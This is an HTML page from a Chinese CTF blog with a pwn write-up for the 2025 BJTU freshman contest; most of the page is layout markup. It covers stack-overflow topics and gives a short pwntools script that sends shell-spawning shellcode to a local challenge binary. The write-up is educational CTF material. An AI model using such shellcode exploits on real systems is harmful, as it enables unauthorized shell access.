<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="2025å¹´åŒ—äº¬äº¤é€šå¤§å­¦CTFæ–°ç”Ÿèµ›ï¼Œå…¥é—¨æŒ‡åŒ—ã€writeup">
<title>2025BJTUCTF-PWN</title>

<link rel='canonical' href='https://expl0rer.top/p/2025bjtuctf-pwn/'>

<link rel="stylesheet" href="/scss/style.min.84f4364fa3a5758ecded3430d054d555b355a8e9efd1baf1e03c18d73802579f.css"><meta property='og:title' content="2025BJTUCTF-PWN">
<meta property='og:description' content="2025å¹´åŒ—äº¬äº¤é€šå¤§å­¦CTFæ–°ç”Ÿèµ›ï¼Œå…¥é—¨æŒ‡åŒ—ã€writeup">
<meta property='og:url' content='https://expl0rer.top/p/2025bjtuctf-pwn/'>
<meta property='og:site_name' content='Expl0rer.Ct'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-07T13:10:05&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/2025bjtuctf-pwn/BJTUCTF.png' />
<meta name="twitter:title" content="2025BJTUCTF-PWN">
<meta name="twitter:description" content="2025å¹´åŒ—äº¬äº¤é€šå¤§å­¦CTFæ–°ç”Ÿèµ›ï¼Œå…¥é—¨æŒ‡åŒ—ã€writeup"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://expl0rer.top/p/2025bjtuctf-pwn/BJTUCTF.png' />
    <link rel="shortcut icon" href="/favicon.ico" />
<div class="loading">
     
    <div id="ghost">
        <div id="red">
            <div id="pupil"></div>
            <div id="pupil1"></div>
            <div id="eye"></div>
            <div id="eye1"></div>
            <div id="top0"></div>
            <div id="top1"></div>
            <div id="top2"></div>
            <div id="top3"></div>
            <div id="top4"></div>
            <div id="st0"></div>
            <div id="st1"></div>
            <div id="st2"></div>
            <div id="st3"></div>
            <div id="st4"></div>
            <div id="st5"></div>
            <div id="an1"></div>
            <div id="an2"></div>
            <div id="an3"></div>
            <div id="an4"></div>
            <div id="an5"></div>
            <div id="an6"></div>
            <div id="an7"></div>
            <div id="an8"></div>
            <div id="an9"></div>
            <div id="an10"></div>
            <div id="an11"></div>
            <div id="an12"></div>
            <div id="an13"></div>
            <div id="an14"></div>
            <div id="an15"></div>
            <div id="an16"></div>
            <div id="an17"></div>
            <div id="an18"></div>
        </div>
        <div id="shadow"></div>
    </div>
</div>

<style>
    .loading {
        position: fixed;
        display: flex;
        justify-content: center;
        align-items: center;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 99;
        background-color: #f5f5fa;
        transition: opacity 0.5s ease;
    }
	
      
#ghost {
  position: relative;
  scale: 0.8;
}

#red {
  animation: upNDown infinite 1s;
  position: relative;
  width: 140px;
  height: 140px;
  display: grid;
  grid-template-columns: repeat(14, 1fr);
  grid-template-rows: repeat(14, 1fr);
  grid-column-gap: 0px;
  grid-row-gap: 0px;
  grid-template-areas:
    "a1  a2  a3  a4  a5  top0  top0  top0  top0  a10 a11 a12 a13 a14"
    "b1  b2  b3  top1 top1 top1 top1 top1 top1 top1 top1 b12 b13 b14"
    "c1 c2 top2 top2 top2 top2 top2 top2 top2 top2 top2 top2 c13 c14"
    "d1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 d14"
    "e1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 e14"
    "f1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 f14"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "st0 st0 an4 st1 an7 st2 an10 an10 st3 an13 st4 an16 st5 st5"
    "an1 an2 an3 an5 an6 an8 an9 an9 an11 an12 an14 an15 an17 an18";
}

@keyframes upNDown {
  0%,
  49% {
    transform: translateY(0px);
  }
  50%,
  100% {
    transform: translateY(-10px);
  }
}

#top0,
#top1,
#top2,
#top3,
#top4,
#st0,
#st1,
#st2,
#st3,
#st4,
#st5 {
  background-color: red;
}

#top0 {
  grid-area: top0;
}

#top1 {
  grid-area: top1;
}

#top2 {
  grid-area: top2;
}

#top3 {
  grid-area: top3;
}

#top4 {
  grid-area: top4;
}

#st0 {
  grid-area: st0;
}

#st1 {
  grid-area: st1;
}

#st2 {
  grid-area: st2;
}

#st3 {
  grid-area: st3;
}

#st4 {
  grid-area: st4;
}

#st5 {
  grid-area: st5;
}

#an1 {
  grid-area: an1;
  animation: flicker0 infinite 1s;
}

#an18 {
  grid-area: an18;
  animation: flicker0 infinite 1s;
}

#an2 {
  grid-area: an2;
  animation: flicker1 infinite 1s;
}

#an17 {
  grid-area: an17;
  animation: flicker1 infinite 1s;
}

#an3 {
  grid-area: an3;
  animation: flicker1 infinite 1s;
}

#an16 {
  grid-area: an16;
  animation: flicker1 infinite 1s;
}

#an4 {
  grid-area: an4;
  animation: flicker1 infinite 1s;
}

#an15 {
  grid-area: an15;
  animation: flicker1 infinite 1s;
}

#an6 {
  grid-area: an6;
  animation: flicker0 infinite 1s;
}

#an12 {
  grid-area: an12;
  animation: flicker0 infinite 1s;
}

#an7 {
  grid-area: an7;
  animation: flicker0 infinite 1s;
}

#an13 {
  grid-area: an13;
  animation: flicker0 infinite 1s;
}

#an9 {
  grid-area: an9;
  animation: flicker1 infinite 1s;
}

#an10 {
  grid-area: an10;
  animation: flicker1 infinite 1s;
}

#an8 {
  grid-area: an8;
  animation: flicker0 infinite 1s;
}

#an11 {
  grid-area: an11;
  animation: flicker0 infinite 1s;
}

@keyframes flicker0 {
  0%,
  49% {
    background-color: red;
  }
  50%,
  100% {
    background-color: transparent;
  }
}

@keyframes flicker1 {
  0%,
  49% {
    background-color: transparent;
  }
  50%,
  100% {
    background-color: red;
  }
}

#eye {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  left: 10px;
}

#eye::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#eye1 {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  right: 30px;
}

#eye1::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye1::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#pupil {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  left: 10px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

#pupil1 {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  right: 50px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

@keyframes eyesMovement {
  0%,
  49% {
    transform: translateX(0px);
  }
  50%,
  99% {
    transform: translateX(10px);
  }
  100% {
    transform: translateX(0px);
  }
}

#shadow {
  background-color: black;
  width: 140px;
  height: 140px;
  position: absolute;
  border-radius: 50%;
  transform: rotateX(80deg);
  filter: blur(20px);
  top: 80%;
  animation: shadowMovement infinite 1s;
}

@keyframes shadowMovement {
  0%,
  49% {
    opacity: 0.5;
  }
  50%,
  100% {
    opacity: 0.2;
  }
}

</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>

<script>	
    function initLoading() {
        let loading = document.querySelector(".loading");
        document.addEventListener('DOMContentLoaded', function() {
            
            setTimeout(() => {
                loading.style.opacity = "0";
                
                setTimeout(() => {
                    loading.style.display = "none";
                }, 500);
            }, 500); 
        });
    }

    initLoading();
</script>


<link
  rel="stylesheet"
  href="https://cdn-font.hyperos.mi.com/font/css?family=MiSans:400:Chinese_Simplify,Latin&display=swap"
/>



<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreenr.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreenr.css" />


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_1a3c99934e119e1b.png" width="300"
                            height="268" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ«¡</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Expl0rer.Ct</a></h1>
            <h2 class="site-description">å¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://space.bilibili.com/695179979?spm_id_from=333.40138.0.0'
                        target="_blank"
                        title="Bilibili"
                        rel="me"
                    >
                        
                        
                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/Expl0rer-Ct'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ | Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E-about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº | About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£ | Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢ | Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>æŠ€æœ¯é“¾æ¥ | Links</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹æƒ…é“¾æ¥ | Friends Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <!--
tags: [temperature, hot, wheater, thermometer, forecast]
category: Weather
version: "1.73"
unicode: "f236"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#ff9500"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-sun-high"
>
  <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" />
  <path d="M6.343 17.657l-1.414 1.414" />
  <path d="M6.343 6.343l-1.414 -1.414" />
  <path d="M17.657 6.343l1.414 -1.414" />
  <path d="M17.657 17.657l1.414 1.414" />
  <path d="M4 12h-2" />
  <path d="M12 4v-2" />
  <path d="M20 12h2" />
  <path d="M12 20v2" />
</svg>

                        <!--
tags: [night, dark mode]
category: Weather
version: "1.21"
unicode: "ece7"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#8d6e63"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-moon-stars"
>
  <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
  <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2" />
  <path d="M19 11h2m-1 -1v2" />
</svg>

                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#å‰æ²¿æ¦‚è¿°">å‰æ²¿æ¦‚è¿°</a></li>
    <li><a href="#bjtuctfwp">BJTUCTFâ€”â€”WP</a>
      <ol>
        <li><a href="#pwn1">pwn1</a></li>
        <li><a href="#pwn2">pwn2</a></li>
        <li><a href="#pwn3">pwn3</a>
          <ol>
            <li><a href="#ropgadgetåœ¨æ¼æ´åˆ©ç”¨ä¸­çš„ä½œç”¨">ROPgadgetåœ¨æ¼æ´åˆ©ç”¨ä¸­çš„ä½œç”¨</a></li>
            <li><a href="#å·¥ä½œåŸç†">å·¥ä½œåŸç†</a></li>
            <li><a href="#ä¸»è¦åŠŸèƒ½">ä¸»è¦åŠŸèƒ½</a></li>
            <li><a href="#é¢˜è§£è¿‡ç¨‹">é¢˜è§£è¿‡ç¨‹</a></li>
          </ol>
        </li>
        <li><a href="#pwn4">pwn4</a></li>
        <li><a href="#pwn5">pwn5</a></li>
        <li><a href="#pwn6">pwn6</a></li>
      </ol>
    </li>
    <li><a href="#ç»“å°¾">ç»“å°¾</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/2025bjtuctf-pwn/">
                <img src="/p/2025bjtuctf-pwn/BJTUCTF_hu_8bc32e99d98208da.png"
                        srcset="/p/2025bjtuctf-pwn/BJTUCTF_hu_8bc32e99d98208da.png 800w, /p/2025bjtuctf-pwn/BJTUCTF_hu_bf6464b280ff5022.png 1600w"
                        width="800" 
                        height="399" 
                        loading="lazy"
                        alt="Featured image of post 2025BJTUCTF-PWN" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
                CTF_writeup
            </a>
        
            <a href="/categories/ctfpwn/" style="background-color: #2a9d8f; color: #fff;">
                CTFpwn
            </a>
        
            <a href="/categories/pwn%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/" style="background-color: #2a9d8f; color: #fff;">
                PWNå‰ç½®çŸ¥è¯†
            </a>
        
            <a href="/categories/ctf%E5%85%A5%E9%97%A8/" >
                CTFå…¥é—¨
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/2025bjtuctf-pwn/">2025BJTUCTF-PWN</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            2025å¹´åŒ—äº¬äº¤é€šå¤§å­¦CTFæ–°ç”Ÿèµ›ï¼Œå…¥é—¨æŒ‡åŒ—ã€writeup
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-11-01</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>[TOC]</p>
<h2 id="å‰æ²¿æ¦‚è¿°">å‰æ²¿æ¦‚è¿°
</h2><p>BJTUCTF-PWNï¼š</p>
<p>å‡ºé¢˜ä¸»è¦è€ƒå¯Ÿå…¥é—¨PWN~æ ˆæº¢å‡ºè¿›é˜¶çš„å†…å®¹ï¼Œæ¶‰åŠæ ˆæº¢å‡ºåŸºæœ¬åŸç†ã€libcæ³„éœ²ã€ROPæ„é€ æ”»å‡»é“¾ã€æ²™ç›’é€ƒé€¸ç­‰ã€‚</p>
<p>å‡ºé¢˜ç¯å¢ƒï¼šUbuntu18.04ã€Ubuntu24.04ã€å¤‡ç”¨Kali2024</p>
<p>ç¨‹åºæºä»£ç ç±»å‹ï¼šCè¯­è¨€</p>
<p>å·²å…¬å¸ƒWPã€‚</p>
<h2 id="bjtuctfwp">BJTUCTFâ€”â€”WP
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">  ____       _ _______ _    _  _____ _______ ______ 
</span></span><span class="line"><span class="cl"> |  _ \     | |__   __| |  | |/ ____|__   __|  ____|
</span></span><span class="line"><span class="cl"> | |_) |    | |  | |  | |  | | |       | |  | |__   
</span></span><span class="line"><span class="cl"> |  _ &lt; _   | |  | |  | |  | | |       | |  |  __|  
</span></span><span class="line"><span class="cl"> | |_) | |__| |  | |  | |__| | |____   | |  | |     
</span></span><span class="line"><span class="cl"> |____/ \____/   |_|   \____/ \_____|  |_|  |_|     
</span></span><span class="line"><span class="cl">                                                    
</span></span><span class="line"><span class="cl">                                                 â€”â€”â€”åŒ—äº¬äº¤é€šå¤§å­¦ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‰è¨€ï¼šè¯·å„ä½ä¸è¦å®Œå…¨ç…§æŠ„WPçš„expï¼Œéƒ½æ˜¯ä½œè€…åœ¨<strong>æœ¬åœ°å¤ç°</strong>ï¼Œè¦è¿œç¨‹è¿æ¥é¶æœºå¤ç°å°±ç¨æ”¹ä¸€ä¸‹ï¼ŒåŠ ä¸ªè¿œç¨‹ç«¯å£å’ŒIPå°±å¥½ğŸ˜„ã€‚</p>
<h3 id="pwn1">pwn1
</h3><p><a class="link" href="pwn1" >pwn1</a></p>
<p>è¿™é¢˜æ˜¯è®©å¤§å®¶æµ‹è¯•è‡ªå·±çš„ç¯å¢ƒæ˜¯å¦éƒ¨ç½²æˆåŠŸï¼ŒåŒ…æ‹¬Linuxè™šæ‹Ÿæœºã€ncã€pwntoolsã€python2å’Œ3ç­‰ã€‚</p>
<p>ç›´æ¥è¿è¡Œexpï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#34;ip&#34;, port)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="c1">#io.recv() </span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é¢˜ç”¨æ„åœ¨äºä½ æ˜¯å¦èƒ½ç†è§£æ¯ä¸€è¡Œä»£ç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># å¯¼å…¥pwntoolsåº“ï¼Œè¿™æ˜¯CTFä¸­pwné¢˜å¸¸ç”¨çš„å·¥å…·åº“ï¼Œæä¾›äº†å„ç§æ¼æ´åˆ©ç”¨ç›¸å…³çš„åŠŸèƒ½</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¾ç½®ç¨‹åºè¿è¡Œçš„ä¸Šä¸‹æ–‡ç¯å¢ƒ</span>
</span></span><span class="line"><span class="cl"><span class="c1"># arch=&#39;i386&#39;ï¼šæŒ‡å®šç›®æ ‡ç¨‹åºæ˜¯32ä½æ¶æ„ï¼ˆx86ï¼‰;å½“ç„¶è¿˜æœ‰64ä½æ¶æ„çš„ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„arch = &#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># log_level=&#39;debug&#39;ï¼šè®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºdebugï¼Œä¼šæ˜¾ç¤ºè¯¦ç»†çš„äº¤äº’ä¿¡æ¯ï¼Œæ–¹ä¾¿è°ƒè¯•</span>
</span></span><span class="line"><span class="cl"><span class="c1"># os=&#39;linux&#39;ï¼šæŒ‡å®šç›®æ ‡æ“ä½œç³»ç»Ÿæ˜¯Linux</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
